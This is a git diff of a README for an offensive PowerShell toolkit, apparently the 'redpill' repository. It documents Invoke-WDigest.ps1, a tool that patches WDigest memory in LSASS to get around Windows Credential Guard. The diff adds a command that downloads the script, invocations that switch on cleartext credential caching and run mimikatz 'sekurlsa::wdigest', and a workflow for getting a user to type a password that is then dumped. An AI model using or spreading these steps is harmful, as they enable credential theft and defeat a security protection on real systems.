@@ -1,42 +1,43 @@
-## BypassCredGuard.exe
+## Invoke-WDigest.ps1
 
 |Script Name|Description|Privileges|Notes|
 |---|---|---|---|
-|[BypassCredGuard](https://github.com/r00t-3xp10it/redpill/blob/main/lib/DeviceGuard/DeviceGuard.ps1)|Credential Guard Bypass Via Patching Wdigest Memory|Administrator|Credits: @wh0nsq|
+|[Invoke-WDigest](https://github.com/r00t-3xp10it/redpill/blob/main/lib/DeviceGuard/Invoke-WDigest.ps1)|Credential Guard Bypass Via Patching Wdigest Memory|Administrator|Credits: @wh0nsq, @BenjaminDelpy|
 
 <br />
 
 **download script:**
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/DeviceGuard.ps1" -OutFile "DeviceGuard.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1" -OutFile "Invoke-WDigest.ps1"
 ```
 
 <br />
 
 **run cmdlet:**
 ```powershell
-.\DeviceGuard.ps1
+# Execute M[i]mika[t]z (interactive shell) without WDigest caching
+.\Invoke-WDigest.ps1 -wdigest 'false' -mimicats
+
+#  Ativate WDigest caching + Execute M[i]mika[t]z sekurlsa::wdigest
+.\Invoke-WDigest.ps1 -wdigest 'true' -mimicats
+
+[FAST DEMONSTRATION]
+
+## Ativate WDigest caching + dump credentials
+.\Invoke-WDigest.ps1 -WDigest 'true' -mimicats -runas
+
+WORKFLOW
+   - Invoke-WDigest.ps1 Ativates WDigest caching in memory
+   - Invoke-WDigest.ps1 prompts user to enter credential to start cmd.exe
+   - WDigest will store credential input by user in clear-text in memory
+   - mimikatz will auto-execute 'sekurlsa::wdigest exit' to dump credentials
+
+REMARK
+   RunAs parameter switch exists for demonstration effects, and can not be
+   used remotely because it requires target user interaction (prompt cred)
+   and resource UserName password knowledge ..
 ```
 
 <br />
 
-**Final Notes:**
-```powershell
-BypassCredGuard - Credential Guard Bypass Via Patching Wdigest Memory
-
-## Background
-Adam Chester wrote an article called "Exploring Mimikatz - Part 1 - WDigest" about memory patching to enable UseLogonCredential
-and make Wdigest cache cleartext credentials intrigued me. The wdigest.dll module loaded by the LSASS process has two interesting
-global variables: `g_fParameter_useLogonCredential` and `g_IsCredGuardEnabled`, their role is self-evident from the name alone,
-the former is used to determine whether the clear text password should be stored in memory , the latter holds the state of the
-Windows Defender Credential Guard within the module, and Wdigest plaintext password caching can be enabled on systems with
-Credential Guard by patching the values of these two global variables in memory.
-
-## Let’s see it in action
-Run the POC we wrote on the system with Credential Guard protection enabled.
-When the user enters the username and password to log in again, we get his plaintext password again
-```
-
-<br />
-
-![poc](https://github.com/r00t-3xp10it/redpill/blob/main/lib/DeviceGuard/DeviceGuard.png)
+![poc](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.png)
